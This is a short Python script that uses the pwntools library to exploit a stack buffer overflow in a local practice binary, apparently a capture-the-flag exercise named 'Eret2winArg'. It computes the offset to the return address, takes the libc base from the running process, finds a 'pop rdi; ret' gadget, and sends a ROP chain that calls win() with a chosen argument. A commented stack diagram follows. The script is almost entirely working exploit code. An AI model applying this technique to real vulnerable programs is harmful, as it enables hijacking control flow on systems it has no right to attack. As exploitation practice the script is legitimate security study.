
from pwn import *


elf = context.binary = ELF("./Eret2winArg", checksec=False)

p = process(elf.path)
p.sendline(cyclic(200))
p.wait()

core = p.corefile
data_crash = core.read(core.rsp, 8)
offset = cyclic_find(data_crash[:4])
log.info(f"Offset to RET: {offset}")

p = process(elf.path)

libc = elf.libc
log.info(f"libc.address: {hex(libc.address)}") #will be 0 'cause i don't have address now
libc.address = p.libc.address  # where the entier libc libarry start
log.info(f"libc.address after load them from dynamic runtime: {hex(libc.address)}")

#  Search ROP gadgets inside libc after loaded from runtime /proc/PID/maps
rop_libc = ROP(libc)
pop_rdi = rop_libc.find_gadget(['pop rdi', 'ret'])[0]
#ret = rop_libc.find_gadget(['ret'])[0]                 # i don't need it now cause i have defualt ret after pop

win = elf.sym["win"]
target_arg = 0xdeadbeef

log.info(f"pop rdi gadget: {hex(pop_rdi)}")
log.info(f"win() address  : {hex(win)}")

#  Build payload using libc's pop rdi
payload = flat(
    b"A" * offset,
    pop_rdi,
    target_arg,
#    ret,  # Stack alignment (movaps fix)
    win
)


p.sendline(payload)
print(p.recvall().decode())
"""
the stack
        vuln()
        ret -> pop instruct
        pop read the stack
        ret read stack

        STACK
        rip
        0x932fac -> for pop
        0xdeadbeef
        win_addr


"""
